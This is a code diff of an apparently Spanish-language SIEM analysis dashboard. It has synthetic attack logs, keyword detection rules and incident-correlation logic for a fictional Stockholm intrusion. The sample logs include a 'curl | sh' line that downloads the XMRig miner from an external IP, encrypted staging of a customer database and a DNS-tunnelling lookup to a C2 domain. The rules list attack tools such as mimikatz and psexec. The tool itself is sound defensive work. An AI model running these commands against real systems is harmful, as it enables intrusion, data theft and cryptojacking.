+                // 6. Otras anomalías (Exfiltración de datos y Beaconing C2)
+                { Timestamp: "2026-10-26 02:35:09", EventID: "4688", Host: "STHLM-DB-PROD", User: "svc_backup", SourceIP: "10.20.0.50", DestIP: "10.20.0.50", Action: "Data Staging", Command: "7z.exe a -pInfected2026 C:\\ProgramData\\clientes_se.7z D:\\SQLData\\Customers.bak", Details: "Compresión cifrada de respaldo de base de datos de clientes en ruta oculta previo a exfiltración" },
+                { Timestamp: "2026-10-26 02:38:50", EventID: "3001", Host: "STHLM-FW-CORE", User: "svc_backup", SourceIP: "10.20.0.50", DestIP: "91.214.124.88", Action: "Data Exfiltration", Command: "HTTPS POST 4.8 GB -> 91.214.124.88:8443", Details: "Anomalía volumétrica: Transferencia saliente masiva de 4.8 GB hacia IP externa desconocida en puerto no estándar 8443" },
+                { Timestamp: "2026-10-26 02:41:10", EventID: "22", Host: "STHLM-DB-PROD", User: "SYSTEM", SourceIP: "10.20.0.50", DestIP: "8.8.8.8", Action: "DNS Tunneling C2", Command: "nslookup a8f9d0c1e2b3.c2-update-nordic.xyz", Details: "Anomalía de red: Consultas DNS TXT de alta entropía compatibles con canal encubierto Command & Control (C2)" },
+
+                // Tráfico normal intermedio
+                { Timestamp: "2026-10-26 03:05:00", EventID: "4624", Host: "STHLM-MAIL-01", User: "lars.holm", SourceIP: "10.20.2.14", DestIP: "10.20.0.18", Action: "Logon Success", Command: "outlook.exe", Details: "Sincronización normal de buzón corporativo Exchange" },
+
+                // INCIDENTE #2 (INDEPENDIENTE): Intento oportunista de Fuerza Bruta y criptominería en servidor DMZ desde otra IP
+                { Timestamp: "2026-10-26 04:10:12", EventID: "4625", Host: "STHLM-DMZ-WEB02", User: "root", SourceIP: "45.155.205.99", DestIP: "172.16.10.20", Action: "SSH Brute Force", Command: "sshd[8821]: Failed password for root", Details: "Ráfaga de fuerza bruta SSH contra servidor web en DMZ desde botnet externa (45.155.205.99)" },
+                { Timestamp: "2026-10-26 04:10:18", EventID: "4625", Host: "STHLM-DMZ-WEB02", User: "admin", SourceIP: "45.155.205.99", DestIP: "172.16.10.20", Action: "SSH Brute Force", Command: "sshd[8825]: Failed password for invalid user admin", Details: "Escaneo automatizado de credenciales por diccionario en puerto 22 de la DMZ" },
+                { Timestamp: "2026-10-26 04:12:04", EventID: "4688", Host: "STHLM-DMZ-WEB02", User: "www-data", SourceIP: "45.155.205.99", DestIP: "172.16.10.20", Action: "Webshell Execution", Command: "bash -c 'curl -s http://45.155.205.99/xmrig.sh | sh'", Details: "Ejecución de comando sospechoso vía vulnerabilidad web intentando descargar binario de criptominería XMRig" },
+                { Timestamp: "2026-10-26 04:13:01", EventID: "5156", Host: "STHLM-DMZ-WEB02", User: "www-data", SourceIP: "172.16.10.20", DestIP: "45.155.205.99", Action: "Abnormal Outbound Port", Command: "TCP SYN -> 45.155.205.99:3333 (Stratum Pool)", Details: "Anomalía de tráfico: Intento de conexión saliente a pool de minería en puerto TCP 3333 bloqueado parcialmente" }
+            ];
+        }
+
+        // =====================================================================
+        // 2. MOTOR DE DETECCIÓN HEURÍSTICA (6 CATEGORÍAS) Y CORRELACIÓN
+        // =====================================================================
+        function analyzeSIEMLogs(logsInput) {
+            // Contadores de IPs con fallos de login para detectar fuerza bruta por correlación
+            const failedLoginByIP = {};
+            logsInput.forEach(row => {
+                const txt = `${row.EventID} ${row.Action} ${row.Command} ${row.Details}`.toLowerCase();
+                if (txt.includes("4625") || txt.includes("failed") || txt.includes("fallo") || txt.includes("auth fail") || txt.includes("brute")) {
+                    const ip = row.SourceIP || "Unknown";
+                    failedLoginByIP[ip] = (failedLoginByIP[ip] || 0) + 1;
+                }
+            });
+
+            analyzedLogs = logsInput.map((row, idx) => {
+                const text = `${row.EventID || ''} ${row.Action || ''} ${row.Command || ''} ${row.Details || ''} ${row.User || ''}`.toLowerCase();
+                const hour = parseHour(row.Timestamp);
+                const srcIP = String(row.SourceIP || "");
+
+                let category = "Normal";
+                let severity = "Bajo";
+                let mitre = "N/A";
+                let explanation = "Evento operativo habitual sin indicadores maliciosos.";
+
+                // Regla 1: Fuerza bruta
+                if (
+                    text.includes("4625") ||
+                    text.includes("brute") ||
+                    text.includes("fuerza bruta") ||
+                    text.includes("failed password") ||
+                    text.includes("logon failed") ||
+                    text.includes("auth fail") ||
+                    text.includes("spraying")
+                ) {
+                    category = "Fuerza bruta";
+                    severity = (failedLoginByIP[srcIP] >= 3 || text.includes("spraying")) ? "Alto" : "Medio";
+                    mitre = "T1110 - Brute Force";
+                    explanation = `Múltiples intentos fallidos de autenticación detectados desde la IP ${srcIP} contra el usuario '${row.User}'.`;
+                }
+                // Regla 3: Escalamiento de privilegios
+                else if (
+                    text.includes("4672") ||
+                    text.includes("4728") ||
+                    text.includes("4732") ||
+                    text.includes("domain admins") ||
+                    text.includes("localgroup administrators") ||
+                    text.includes("sedebugprivilege") ||
+                    text.includes("privilege escalation") ||
+                    text.includes("sudo ") ||
+                    text.includes("escalamiento")
+                ) {
+                    category = "Escalamiento";
+                    severity = "Crítico";
+                    mitre = "T1548 / T1098 - Privilege Escalation";
+                    explanation = `Elevación no autorizada de privilegios o inclusión del usuario '${row.User}' en grupos administrativos críticos en ${row.Host}.`;
+                }
+                // Regla 5: Movimiento lateral
+                else if (
+                    text.includes("5140") ||
+                    text.includes("admin$") ||
+                    text.includes("c$") ||
+                    text.includes("lateral movement") ||
+                    text.includes("winrm") ||
+                    text.includes("wsmprovhost") ||
+                    text.includes("mstsc") ||
+                    text.includes("psexec") ||
+                    (text.includes("3389") && isInternalIP(srcIP))
+                ) {
+                    category = "Movimiento lateral";
+                    severity = "Crítico";
+                    mitre = "T1021 - Remote Services (SMB/RDP/WinRM)";
+                    explanation = `Salto lateral interno desde ${srcIP} hacia ${row.Host} (${row.DestIP}) utilizando servicios de administración remota.`;
+                }
+                // Regla 4: Comandos y procesos sospechosos
+                else if (
+                    text.includes("powershell") ||
+                    text.includes("-enc") ||
+                    text.includes("mimikatz") ||
+                    text.includes("lsass") ||
+                    text.includes("minidump") ||
+                    text.includes("whoami") ||
+                    text.includes("net user") ||
+                    text.includes("curl ") ||
+                    text.includes("wget ") ||
+                    text.includes("xmrig") ||
+                    text.includes("webshell") ||
+                    text.includes("7z.exe")
+                ) {
+                    category = "Comandos y procesos";
+                    severity = (text.includes("lsass") || text.includes("-enc") || text.includes("xmrig")) ? "Crítico" : "Alto";
+                    mitre = "T1059 / T1003 - Command & Credential Execution";
+                    explanation = `Ejecución de intérprete de comandos, ofuscación o volcado de memoria en el equipo ${row.Host}: '${row.Command}'.`;
+                }
+                // Regla 6: Otras anomalías (Exfiltración, C2, DNS Tunneling, Puertos inusuales)
+                else if (
+                    text.includes("exfiltration") ||
+                    text.includes("dns tunneling") ||
+                    text.includes("c2") ||
+                    text.includes("8443") ||
+                    text.includes("3333") ||
+                    text.includes("gb ->") ||
+                    text.includes("nslookup") ||
+                    text.includes("abnormal") ||
+                    text.includes("stratum")
+                ) {
+                    category = "Otras anomalías";
+                    severity = text.includes("gb") || text.includes("exfiltration") ? "Crítico" : "Alto";
+                    mitre = "T1041 / T1071 - Exfiltration & C2 Channel";
+                    explanation = `Comportamiento de red anómalo desde ${row.Host} hacia ${row.DestIP}: transferencia masiva de datos o canal encubierto C2.`;
+                }
+                // Regla 2: Inicios sospechosos (IP externa + Login exitoso, horario de madrugada 00-05h, o patrón inusual)
+                else if (
+                    text.includes("anomalous") ||
+                    text.includes("unusual session") ||
+                    text.includes("logontype=10") ||
+                    ((text.includes("4624") || text.includes("logon success")) && (!isInternalIP(srcIP) || (hour >= 0 && hour <= 5 && String(row.User).includes("svc_"))))
+                ) {
+                    category = "Inicios sospechosos";
+                    severity = failedLoginByIP[srcIP] ? "Crítico" : "Alto";
+                    mitre = "T1078 - Valid Accounts";
+                    explanation = `Inicio de sesión válido pero altamente sospechoso para la cuenta '${row.User}' desde ${srcIP} en horario u origen anómalo.`;
+                }
+
+                return {
+                    ...row,
+                    id: idx + 1,
+                    category,
+                    severity,
+                    mitre,
+                    explanation,
+                    isSuspicious: category !== "Normal"
+                };
+            });
+
+            buildSecurityFindings();
+            correlateIncidents();
+            extractAllIoCs();
+            updateKPIs();
+            renderLogsTable();
+            renderSixCategoriesGrid();
+            renderCorrelationSection();
+            renderIoCsSection();
+            renderTimelineSection();
+            renderRiskClassificationTab();
+            renderTechnicalReport();
+            updateDashboardCharts();
+        }
+
+        function parseHour(timestampStr) {
+            if (!timestampStr) return 12;
+            const match = String(timestampStr).match(/(\d{1,2}):(\d{2})/);
+            return match ? parseInt(match[1], 10) : 12;
+        }
+
+        function isInternalIP(ip) {
+            if (!ip) return true;
+            return ip.startsWith("10.") || ip.startsWith("192.168.") || ip.startsWith("172.16.") || ip.startsWith("127.");
+        }
+
+        // Agrupa eventos sospechosos en las 6 categorías con su justificación y evidencias
+        function buildSecurityFindings() {
+            const grouped = {};
+            Object.keys(SIX_CATEGORIES_META).forEach(cat => {
+                grouped[cat] = [];
+            });
+
+            analyzedLogs.filter(l => l.isSuspicious).forEach(log => {
+                if (grouped[log.category]) {
+                    grouped[log.category].push(log);
+                }
+            });
+
+            const defaultDetails = {
+                "Fuerza bruta": {
+                    severity: "Alto",
+                    cvss: "8.1",
+                    technicalExplanation: "Se identificaron ráfagas automatizadas de intentos de inicio de sesión fallidos (EventID 4625 / SSH Auth Fail) dirigidos contra cuentas de servicio ('svc_backup') y cuentas administrativas ('admin_se', 'root') desde direcciones IP externas asociadas a nodos de anonimización TOR (185.220.101.45) y botnets (45.155.205.99). El patrón evidencia ataques combinados de diccionario y Password Spraying.",
+                    justification: "Se clasifica como ALTO porque el ataque de fuerza bruta logró adivinar exitosamente la credencial de la cuenta 'svc_backup', convirtiéndose en el vector de acceso inicial a la red interna del cliente en Estocolmo.",
+                    impact: "Compromiso inicial del perímetro VPN/SSH, bloqueo potencial de cuentas operativas por umbral de intentos y exposición de credenciales débiles."
+                },
+                "Inicios sospechosos": {
+                    severity: "Crítico",
+                    cvss: "9.0",
+                    technicalExplanation: "Inmediatamente después de los intentos de fuerza bruta, se registró un inicio de sesión exitoso (EventID 4624, LogonType 10 - RemoteInteractive) a las 02:15 UTC fuera del horario laboral de Estocolmo desde la misma IP atacante (185.220.101.45). Adicionalmente, la cuenta de servicio 'svc_backup' inició sesiones interactivas gráficas inusuales en servidores donde nunca había operado.",
+                    justification: "Se clasifica como CRÍTICO porque confirma que el atacante obtuvo acceso efectivo dentro de la red corporativa utilizando credenciales válidas comprometidas (MITRE T1078).",
+                    impact: "Evasión de controles perimetrales al operar bajo la identidad legítima de un servicio interno de copias de seguridad."
+                },
+                "Escalamiento": {
+                    severity: "Crítico",
+                    cvss: "9.8",
+                    technicalExplanation: "Una vez dentro del servidor de aplicaciones (STHLM-APP-02), el atacante obtuvo el privilegio de depuración del sistema (SeDebugPrivilege - EventID 4672) y ejecutó comandos para añadir la cuenta 'svc_backup' a los grupos 'Administrators' local y 'Domain Admins' del Directorio Activo (EventID 4728).",
+                    justification: "Se clasifica como CRÍTICO (CVSS 9.8) debido a la toma de control total del dominio Windows (Domain Admin), lo que otorga al adversario control irrestricto sobre todos los servidores y estaciones de la organización.",
+                    impact: "Pérdida total de la integridad del Directorio Activo y capacidad de desactivar controles de seguridad (EDR/Antivirus) en toda la empresa."
+                },
+                "Comandos y procesos": {
+                    severity: "Crítico",
+                    cvss: "9.6",
+                    technicalExplanation: "Se detectó la creación de procesos altamente maliciosos (EventID 4688 / 4104): enumeración con 'whoami /priv' y 'net user /domain', ejecución de scripts PowerShell ocultos y codificados en Base64 (-nop -w hidden -enc), volcado de memoria del subsistema LSASS ('comsvcs.dll MiniDump lsass.dmp') para extraer hashes NTLM, y en la DMZ ejecución de 'curl | sh' para descargar el minero XMRig.",
+                    justification: "Se clasifica como CRÍTICO porque involucra robo directo de credenciales en memoria (Credential Dumping) y ejecución remota de código arbitrario.",
+                    impact: "Compromiso masivo de contraseñas y hashes de usuarios del dominio, permitiendo persistencia y suplantación de identidad."
+                },
+                "Movimiento lateral": {
+                    severity: "Crítico",
+                    cvss: "9.3",
+                    technicalExplanation: "Utilizando los privilegios elevados y hashes extraídos, el atacante se desplazó lateralmente desde STHLM-APP-02 (10.20.1.55) hacia el Controlador de Dominio STHLM-DC-01 (10.20.0.10) mediante recursos compartidos administrativos SMB (ADMIN$ y C$, EventID 5140) y WinRM (EventID 4648). Posteriormente saltó por RDP (puerto 3389) hacia el servidor de Base de Datos de Producción STHLM-DB-PROD (10.20.0.50).",
+                    justification: "Se clasifica como CRÍTICO porque el atacante alcanzó los activos más sensibles de la organización (Controlador de Dominio y Base de Datos Financiera de Producción).",
+                    impact: "Propagación transversal de la intrusión hacia la bóveda de datos críticos del negocio."
+                },
+                "Otras anomalías": {
+                    severity: "Crítico",
+                    cvss: "9.5",
+                    technicalExplanation: "En el servidor de base de datos STHLM-DB-PROD se comprimió una copia de clientes con contraseña ('clientes_se.7z') y se registró una transferencia HTTPS saliente anómala de 4.8 GB hacia la IP externa 91.214.124.88 por el puerto no estándar 8443. Simultáneamente se detectaron consultas DNS TXT de alta entropía hacia 'c2-update-nordic.xyz' (DNS Tunneling) y tráfico TCP 3333 (Stratum) en la DMZ.",
+                    justification: "Se clasifica como CRÍTICO al confirmarse la exfiltración de 4.8 GB de información confidencial fuera de la red del cliente, con implicaciones regulatorias severas (GDPR en Suecia/UE).",
+                    impact: "Fuga de datos sensibles de clientes, posibles sanciones bajo normativa europea GDPR, daño reputacional y riesgo de extorsión."
+                }
+            };
+
+            securityFindings = Object.keys(SIX_CATEGORIES_META).map((catKey, index) => {
+                const logsForCat = grouped[catKey] || [];
+                const meta = SIX_CATEGORIES_META[catKey];
+                const def = defaultDetails[catKey];
+
+                // Determinar severidad real según logs encontrados
+                let computedSeverity = def.severity;
+                if (logsForCat.length === 0) {
+                    computedSeverity = "Bajo";
+                }
+
+                return {
+                    id: `FIND-0${index + 1}`,
+                    category: catKey,
+                    mitre: meta.mitre,
+                    count: logsForCat.length,
+                    severity: computedSeverity,
+                    cvss: logsForCat.length > 0 ? def.cvss : "2.0",
+                    technicalExplanation: logsForCat.length > 0
+                        ? def.technicalExplanation
+                        : `No se observaron firmas directas de '${catKey}' en el lote actual, aunque se mantiene monitoreo preventivo.`,
+                    justification: logsForCat.length > 0
+                        ? def.justification
+                        : `Clasificado como Bajo por ausencia de eventos confirmados en esta categoría específica.`,
+                    impact: def.impact,
+                    evidences: logsForCat
+                };
+            });
+        }
+
+        // Correlaciona los eventos para responder a la misión: ¿Hubo uno o varios incidentes?
+        function correlateIncidents() {
+            const suspicious = analyzedLogs.filter(l => l.isSuspicious);
+            if (suspicious.length === 0) {
+                correlatedIncidents = [];
+                return;
+            }
+            if (!currentMission.isDefault) { correlateGeneric(suspicious); return; }
+
+            // Agrupamos por cadenas de ataque:
+            // Incidente 1: Cadena principal APT / Exfiltración (involucra svc_backup, 185.220.101.45, 91.214.124.88, red 10.20.x.x)
+            const inc1Logs = suspicious.filter(l =>
+                String(l.SourceIP).includes("185.220.") ||
+                String(l.DestIP).includes("91.214.") ||
+                String(l.User).includes("svc_backup") ||
+                String(l.User).includes("admin_se") ||
+                String(l.Host).includes("STHLM-VPN") ||
+                String(l.Host).includes("STHLM-APP") ||
+                String(l.Host).includes("STHLM-DC") ||
+                String(l.Host).includes("STHLM-DB") ||
+                String(l.Host).includes("STHLM-FW")
+            );
+
+            // Incidente 2: Ataque oportunista independiente en DMZ (involucra 45.155.205.99, STHLM-DMZ-WEB02, www-data, xmrig)
+            const inc2Logs = suspicious.filter(l => !inc1Logs.includes(l));
+
+            correlatedIncidents = [];
+
+            if (inc1Logs.length > 0) {
+                correlatedIncidents.push({
+                    code: "INC-2026-STHLM-01",
+                    title: "Incidente Principal: Intrusión Dirigida, Compromiso de Dominio y Exfiltración de Base de Datos",
+                    severity: "Crítico",
+                    actorIp: "185.220.101.45 (Acceso) / 91.214.124.88 (Exfiltración C2)",
+                    compromisedUsers: ["svc_backup", "admin_se (intento)"],
+                    compromisedHosts: ["STHLM-VPN-GW01", "STHLM-APP-02", "STHLM-DC-01", "STHLM-DB-PROD"],
+                    killChainStages: [
+                        "1. Fuerza Bruta VPN (185.220.101.45)",
+                        "2. Inicio Sospechoso (02:15 UTC - svc_backup)",
+                        "3. Comandos PowerShell Base64 y LSASS Dump",
+                        "4. Escalamiento a Domain Admins",
+                        "5. Movimiento Lateral SMB/WinRM/RDP a DC y DB",
+                        "6. Exfiltración de 4.8 GB y DNS Tunneling C2"
+                    ],
+                    summary: "Ataque multi-etapa altamente coordinado. El adversario vulneró la cuenta 'svc_backup' mediante fuerza bruta en la VPN, escaló privilegios hasta Administrador de Dominio, se desplazó lateralmente hacia el Controlador de Dominio y la Base de Datos de Producción, y exfiltró 4.8 GB de datos cifrados.",
+                    logs: inc1Logs
+                });
+            }
+
+            if (inc2Logs.length > 0) {
+                correlatedIncidents.push({
+                    code: "INC-2026-STHLM-02",
+                    title: "Incidente Secundario (Aislado en DMZ): Fuerza Bruta SSH y Despliegue de Criptominero XMRig",
+                    severity: "Alto",
+                    actorIp: "45.155.205.99",
+                    compromisedUsers: ["www-data", "root (intento)"],
+                    compromisedHosts: ["STHLM-DMZ-WEB02"],
+                    killChainStages: [
+                        "1. Fuerza Bruta SSH contra DMZ",
+                        "2. Ejecución de comando curl | sh por usuario www-data",
+                        "3. Conexión saliente a Pool Stratum (Puerto 3333)"
+                    ],
+                    summary: "Incidente independiente y oportunista ocurrido a las 04:10 UTC en la zona desmilitarizada (DMZ). Un actor externo (45.155.205.99) realizó fuerza bruta SSH y explotó el servicio web para ejecutar un script de criptominería (XMRig) sin relación con el robo de datos del Incidente #1.",
+                    logs: inc2Logs
+                });
+            }
+        }
+
+        // Correlación genérica (misiones nuevas): une eventos sospechosos que comparten IP externa o usuario
+        function correlateGeneric(suspicious) {
+            const parent = suspicious.map((_, i) => i);
+            const find = i => parent[i] === i ? i : (parent[i] = find(parent[i]));
+            const owner = {};
+            const isExt = ip => ip && !isInternalIP(ip) && ip !== "8.8.8.8";
+            suspicious.forEach((l, i) => {
+                const keys = [];
+                if (isExt(l.SourceIP)) keys.push("ip:" + l.SourceIP);
+                if (isExt(l.DestIP)) keys.push("ip:" + l.DestIP);
+                if (l.User) keys.push("u:" + l.User);
+                keys.forEach(k => { if (k in owner) parent[find(i)] = find(owner[k]); else owner[k] = i; });
+            });
+            const groups = {};
+            suspicious.forEach((l, i) => { (groups[find(i)] = groups[find(i)] || []).push(l); });
+            const rank = { "Bajo": 0, "Medio": 1, "Alto": 2, "Crítico": 3 };
+            const uniq = arr => [...new Set(arr.filter(Boolean))];
+            correlatedIncidents = Object.values(groups).map(logs => {
+                const sev = logs.reduce((a, l) => (rank[l.severity] ?? 0) > (rank[a] ?? 0) ? l.severity : a, "Bajo");
+                const cats = uniq(logs.map(l => l.category));
+                const ips = uniq(logs.flatMap(l => [l.SourceIP, l.DestIP]).filter(isExt));
+                return { severity: sev, rank: rank[sev] ?? 0, cats, ips, logs };
+            }).sort((a, b) => b.rank - a.rank || b.logs.length - a.logs.length).map((g, n) => ({
+                code: `INC-${currentMission.caseId}-${String(n + 1).padStart(2, "0")}`,
+                title: `Actividad correlacionada: ${g.cats.join(" + ")}`,
+                severity: g.severity,
+                actorIp: g.ips.join(" / ") || "No identificado (origen interno)",
+                compromisedUsers: uniq(g.logs.map(l => l.User)),
+                compromisedHosts: uniq(g.logs.map(l => l.Host)),
+                killChainStages: g.cats.map((c, i) => `${i + 1}. ${c}`),
+                summary: `Se agruparon ${g.logs.length} eventos sospechosos que comparten indicadores (IP externa o usuario), entre ${g.logs[0].Timestamp} y ${g.logs[g.logs.length - 1].Timestamp}. Técnicas observadas: ${g.cats.join(", ")}.`,
+                logs: g.logs
+            }));
+        }
+
+        function extractAllIoCs() {
+            const ips = new Set();
+            const users = new Set();
+            const hosts = new Set();
+            const commands = new Set();
+
+            analyzedLogs.filter(l => l.isSuspicious).forEach(l => {
+                if (l.SourceIP && !isInternalIP(l.SourceIP)) ips.add(`${l.SourceIP} (Origen Externo Atacante)`);
+                if (l.DestIP && !isInternalIP(l.DestIP) && l.DestIP !== "8.8.8.8") ips.add(`${l.DestIP} (Destino Exfiltración / C2)`);
+                if (l.User) users.add(l.User);
+                if (l.Host) hosts.add(l.Host);
+                if (l.Command) commands.add(l.Command);
+            });
+
+            // Añadir dominio C2 si aparece en detalles
+            analyzedLogs.forEach(l => {
+                if (String(l.Command).includes("c2-update-nordic.xyz")) {
+                    ips.add("c2-update-nordic.xyz (Dominio C2 DNS Tunneling)");
+                }
+            });
+
+            extractedIoCs = {
+                ips: Array.from(ips),
+                users: Array.from(users),
+                hosts: Array.from(hosts),
+                commands: Array.from(commands).slice(0, 8)
+            };
+        }
+
+        // =====================================================================
+        // 3. RENDERIZADO DE INTERFAZ Y TABLAS
+        // =====================================================================
+        function updateKPIs() {
+            const total = analyzedLogs.length;
+            const suspicious = analyzedLogs.filter(l => l.isSuspicious).length;
+            const pct = total > 0 ? Math.round((suspicious / total) * 100) : 0;
+            const activeFindings = securityFindings.filter(f => f.count > 0).length;
+
+            document.getElementById("kpi-total-logs").textContent = total;
+            document.getElementById("kpi-suspicious-logs").textContent = suspicious;
+            document.getElementById("kpi-suspicious-pct").textContent = `${pct}% del total de eventos`;
+            document.getElementById("kpi-total-findings").textContent = `${activeFindings} / 6`;
+            document.getElementById("kpi-incidents-count").textContent = correlatedIncidents.length;
+            document.getElementById("kpi-incidents-label").textContent =
+                correlatedIncidents.length > 1
+                    ? "Múltiples incidentes confirmados"
+                    : correlatedIncidents.length === 1
+                    ? "1 incidente correlacionado"
+                    : "Sin incidentes";
+
+            const hasCritical = securityFindings.some(f => f.severity === "Crítico" && f.count > 0);
+            const riskEl = document.getElementById("kpi-global-risk");
+            riskEl.textContent = hasCritical ? "CRÍTICO" : suspicious > 0 ? "ALTO" : "BAJO";
+        }
+
+        function getSeverityBadge(severity) {
+            const map = {
+                "Crítico": "bg-red-500/20 text-red-300 border-red-500/40",
+                "Alto": "bg-orange-500/20 text-orange-300 border-orange-500/40",
+                "Medio": "bg-amber-500/20 text-amber-300 border-amber-500/40",
+                "Bajo": "bg-slate-800 text-slate-300 border-slate-700"
+            };
+            const cls = map[severity] || map["Bajo"];
+            return `<span class="px-2 py-0.5 rounded-md text-[11px] font-bold border ${cls}">${severity}</span>`;
+        }
+
+        function renderLogsTable() {
+            const tbody = document.getElementById("logs-table-body");
+            const search = (document.getElementById("log-search-input")?.value || "").toLowerCase();
+            const catFilter = document.getElementById("log-category-filter")?.value || "ALL";
+
+            const filtered = analyzedLogs.filter(row => {
+                if (catFilter === "SUSPICIOUS_ONLY" && !row.isSuspicious) return false;
+                if (catFilter !== "ALL" && catFilter !== "SUSPICIOUS_ONLY" && row.category !== catFilter) return false;
+                if (search) {
+                    const hay = `${row.Timestamp} ${row.EventID} ${row.Host} ${row.User} ${row.SourceIP} ${row.DestIP} ${row.Command} ${row.Details} ${row.category}`.toLowerCase();
+                    if (!hay.includes(search)) return false;
+                }
+                return true;
+            });
+
+            if (filtered.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="9" class="py-8 text-center text-slate-400">No se encontraron eventos que coincidan con el filtro seleccionado.</td></tr>`;
+                return;
+            }
+
+            tbody.innerHTML = filtered.map(row => {
+                const rowBg = row.isSuspicious
+                    ? row.severity === "Crítico"
+                        ? "bg-red-950/20 hover:bg-red-950/35"
+                        : "bg-amber-950/15 hover:bg-amber-950/30"
+                    : "hover:bg-slate-800/40";
+
+                const catMeta = SIX_CATEGORIES_META[row.category];
+                const catBadge = catMeta
+                    ? `<span class="px-2 py-0.5 rounded text-[11px] border ${catMeta.badgeClass}">${row.category}</span>`
+                    : `<span class="px-2 py-0.5 rounded text-[11px] bg-slate-800 text-slate-400">Normal</span>`;
+
+                return `
+                    <tr class="${rowBg} transition">
+                        <td class="py-2.5 px-3 text-slate-400">${row.id}</td>
+                        <td class="py-2.5 px-3 whitespace-nowrap text-slate-200">${escapeHtml(row.Timestamp)}</td>
+                        <td class="py-2.5 px-3 text-cyan-400 font-semibold">${escapeHtml(row.EventID)}</td>
+                        <td class="py-2.5 px-3 text-white font-medium whitespace-nowrap">${escapeHtml(row.Host)}</td>
+                        <td class="py-2.5 px-3 text-amber-300 whitespace-nowrap">${escapeHtml(row.User)}</td>
+                        <td class="py-2.5 px-3 whitespace-nowrap">
+                            <span class="text-slate-200">${escapeHtml(row.SourceIP)}</span>
+                            <span class="text-slate-400 mx-1">→</span>
+                            <span class="text-cyan-300">${escapeHtml(row.DestIP)}</span>
+                        </td>
+                        <td class="py-2.5 px-3 max-w-md">
+                            <div class="text-slate-100 truncate" title="${escapeHtml(row.Command)}">${escapeHtml(row.Command)}</div>
+                            <div class="text-[11px] text-slate-400 font-sans truncate" title="${escapeHtml(row.Details)}">${escapeHtml(row.Details)}</div>
+                        </td>
+                        <td class="py-2.5 px-3 whitespace-nowrap">${catBadge}</td>
+                        <td class="py-2.5 px-3 whitespace-nowrap">${getSeverityBadge(row.severity)}</td>
+                    </tr>
+                `;
+            }).join("");
+        }
+
+        function renderSixCategoriesGrid() {
+            const container = document.getElementById("six-categories-grid");
+            container.innerHTML = securityFindings.map(finding => {
+                const meta = SIX_CATEGORIES_META[finding.category];
+                const isSelected = activeCategoryFilter === finding.category;
+                const borderCls = isSelected
+                    ? "border-cyan-400 ring-2 ring-cyan-500/30 bg-slate-800/90"
+                    : "border-slate-700/80 hover:border-slate-600 bg-slate-950/80";
+
+                return `
+                    <div onclick="filterByCategoryCard('${finding.category}')" class="cursor-pointer rounded-2xl p-5 border ${borderCls} transition flex flex-col justify-between">
+                        <div>
+                            <div class="flex items-center justify-between gap-2 mb-3">
+                                <span class="text-xs font-mono text-cyan-400">${meta.mitre}</span>
+                                ${getSeverityBadge(finding.severity)}
+                            </div>
+                            <h3 class="text-lg font-bold text-white">${meta.title}</h3>
+                            <p class="text-xs text-slate-300 mt-1">${meta.subtitle}</p>
+                        </div>
+                        <div class="mt-4 pt-3 border-t border-slate-800/90 flex items-center justify-between">
+                            <span class="text-xs text-slate-400">Eventos detectados:</span>
+                            <span class="text-lg font-mono font-bold text-white px-2.5 py-0.5 rounded-lg bg-slate-800">${finding.count}</span>
+                        </div>
+                    </div>
+                `;
+            }).join("");
+        }
+
+        function filterByCategoryCard(categoryName) {
+            activeCategoryFilter = categoryName;
+            renderSixCategoriesGrid();
+            renderTimelineSection();
+            showToast(`Filtrando línea de tiempo por: ${categoryName}`, "info");
+        }
+
+        function resetCategoryFilter() {
+            activeCategoryFilter = "ALL";
+            renderSixCategoriesGrid();
+            renderTimelineSection();
+        }
+
+        function renderCorrelationSection() {
+            const badge = document.getElementById("correlation-verdict-badge");
+            const container = document.getElementById("incidents-correlation-container");
+
+            badge.textContent = correlatedIncidents.length > 1
+                ? `Dictamen SOC: ${correlatedIncidents.length} Incidentes Independientes Detectados`
+                : correlatedIncidents.length === 1
+                ? `Dictamen SOC: 1 Incidente Correlacionado`
+                : `Sin Incidentes Activos`;
+
+            if (correlatedIncidents.length === 0) {
+                container.innerHTML = `<div class="p-4 rounded-xl bg-slate-950 text-slate-400 text-xs">No se detectaron incidentes en los logs actuales.</div>`;
+                return;
+            }
+
+            container.innerHTML = correlatedIncidents.map(inc => `
+                <div class="p-5 rounded-2xl bg-slate-950 border border-slate-800 space-y-3">
+                    <div class="flex flex-wrap items-center justify-between gap-2">
+                        <div class="flex items-center gap-2">
+                            <span class="px-2.5 py-0.5 rounded font-mono text-xs bg-cyan-500/15 text-cyan-300 border border-cyan-500/30">${inc.code}</span>
+                            <h4 class="font-bold text-white text-sm sm:text-base">${inc.title}</h4>
+                        </div>
+                        ${getSeverityBadge(inc.severity)}
+                    </div>
+                    <p class="text-xs text-slate-300 leading-relaxed">${inc.summary}</p>
+                    <div class="grid grid-cols-1 sm:grid-cols-3 gap-2 pt-2 text-xs">
+                        <div class="p-2.5 rounded-xl bg-slate-900 border border-slate-800">
+                            <span class="text-slate-400 block text-[11px]">IPs Atacantes / C2:</span>
+                            <span class="font-mono text-red-300 font-semibold">${inc.actorIp}</span>
+                        </div>
+                        <div class="p-2.5 rounded-xl bg-slate-900 border border-slate-800">
+                            <span class="text-slate-400 block text-[11px]">Usuarios Afectados:</span>
+                            <span class="font-mono text-amber-300 font-semibold">${inc.compromisedUsers.join(", ")}</span>
+                        </div>
+                        <div class="p-2.5 rounded-xl bg-slate-900 border border-slate-800">
+                            <span class="text-slate-400 block text-[11px]">Hosts Comprometidos:</span>
+                            <span class="font-mono text-cyan-300 font-semibold">${inc.compromisedHosts.join(", ")}</span>
+                        </div>
+                    </div>
+                    <div class="pt-2">
+                        <span class="text-[11px] font-mono uppercase text-slate-400 block mb-1.5">Cadena de Ataque Correlacionada (Cyber Kill Chain):</span>
+                        <div class="flex flex-wrap gap-1.5">
+                            ${inc.killChainStages.map(st => `<span class="px-2.5 py-1 rounded-lg bg-slate-900 border border-slate-700 text-[11px] text-slate-200">${st}</span>`).join("")}
+                        </div>
+                    </div>
+                </div>
+            `).join("");
+        }
+
+        function renderIoCsSection() {
+            const container = document.getElementById("ioc-list-container");
+            container.innerHTML = `
+                <div class="p-3 rounded-xl bg-slate-950 border border-slate-800">
+                    <span class="text-[11px] uppercase text-red-400 font-semibold block mb-1">IPs Externas y Dominios Maliciosos (${extractedIoCs.ips.length})</span>
+                    <ul class="space-y-1 text-slate-200">
+                        ${extractedIoCs.ips.map(ip => `<li class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-red-400"></span>${escapeHtml(ip)}</li>`).join("") || "<li>Ninguno</li>"}
